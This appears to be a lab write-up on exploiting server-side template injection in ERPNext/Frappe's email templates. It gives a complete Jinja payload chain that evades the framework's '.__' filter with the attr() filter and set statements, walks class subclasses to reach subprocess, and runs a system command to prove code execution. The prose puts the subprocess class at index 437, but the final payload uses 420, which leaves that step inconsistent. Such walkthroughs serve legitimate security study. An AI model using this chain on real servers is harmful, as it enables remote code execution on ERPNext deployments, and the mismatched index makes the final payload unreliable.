## Discovering the Rendering Function
To start to look for templates, we can simply search for "templates" in the administrator login that we've achieved.
The search leads us to "Email Template List".
A page that allows users of ERPNext, to view and create email templates used throughout the application:

![](../../03.%20Screenshots/t5-ss38.png)

Here, we'll insert our SSTI payload in the response field, save the details, and view the template from a user's perspective:

![](../../03.%20Screenshots/t5-ss39.png)

We see the answer 49.
Having confirmed that we can use a basic Jinja template in an email template, we can attempt to build our SSTI payload.

Now that we can easily inspect the output, let's start building our payload. We will replace the "{{7\*7}}" in the template with 
```python
{{ ''.__class__ }} 
```
to determine if we can replicate accessing the class of an empty string as we did in the Python console.

Looking at the response:

![](../../03.%20Screenshots/t5-ss40.png)

We see that we get an error.
To determine why we are running into this, we can look for the error and explore the get_email_template function.
Which leads us to the apps/frappe/frappe/email/doctype/email_template/email_template.py directory.

![](../../03.%20Screenshots/t5-ss41.png)

Reading the function, we see that, before the function is defined, tells Frappe that this method is whitelisted and can be executed via an HTTP request.
Moreover, If the doc argument passed to isinstance function, is a string, the string is deserialized as JSON into a Python object.
Furthermore, the email_template variable is defined, and finally, the next lines render the subject and the body of the template.

To understand why the error is occurring, we can understand the render_template function, which is located in apps/frappe/frappe/utils/jinja.py:

![](../../03.%20Screenshots/t5-ss42.png)

The important part of the function is the if statement:

![](../../03.%20Screenshots/t5-ss43.png)

It seems that the developers have thought about the SSTI issue and attempted to curb any issues by filtering the 
```
".__"
```
characters.
However, we can bypass this.


## SSTI Filter Evasion
Jinja offers one interesting feature called filters.
An example of a filter is the attr() function, which is designed to "get an attribute of an object".
While the filter is expecting the attribute to be accessed with a period followed by two underscores, we could rewrite the payload to use Jinja's syntax, making the "." unnecessary as follows:

```python
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
```

The string variable will replace the two single quotes ('') in the original payload. The rest of the values are the various attributes from the SSTI payload.
Now we can start building the SSTI payload string in the email template builder under the defined variables.

We start by getting the class using "{{string|attr(class)}}":

![](../../03.%20Screenshots/t5-ss44.png)

As a result, we get the str class.
Now that we have bypassed the SSTI filtering, we can proceed to get code execution.


## Getting Code Execution
With our filter bypass in place, we can start to use mro, and discover what class and subclass we can use to get code execution.
We start with the following payload:
```python
{{string|attr(class)|attr(mro)}}
```

The response shows us the mro of the class:

![](../../03.%20Screenshots/t5-ss45.png)

If we try to access the index, we get the following error:

![](../../03.%20Screenshots/t5-ss46.png)

This is because Jinja syntax does not work with "\[" characters after a filter.

To do this, we need to change the double curly braces "{{" and "}}" that are used for expressions in Jinja to a curly brace followed by a percentage sign ("{%" and "%}"), which is used for statements. 
We also need to set a variable using the "set" tag and provide a variable name. 
Finally, we need to make a new expression to access index 1:
Our payload will look like this:

```python
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{{ mro_r[1] }}
```

![](../../03.%20Screenshots/t5-ss47.png)

With this, we can access the object class.
Now, we need to access subclasses, for that we'll do something similar and our payload will look like so:

```python
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r }}
```

The response is as follows:

![](../../03.%20Screenshots/t5-ss48.png)

We get a large list of subclasses that can be accessed and used.
We go through these subclasses, and notice an interesting one which will help us with code execution.

The subprocess class allows us to spawn new processes, connect to their input/output/error pipes, and obtain their return codes:

![](../../03.%20Screenshots/t5-ss49.png)

This means, that the subprocess class can be accessed by index 437, thus our new payload will be:

```python
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[437] }}
```

![](../../03.%20Screenshots/t5-ss50.png)

With this, we can pass the arguments, and get code execution with the following payload:

```python
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420](["/usr/bin/touch","/tmp/test"]) }}
```

Executing the payload, we find our test file, inside the tmp directory, this means we have code execution:

![](../../03.%20Screenshots/t5-ss51.png)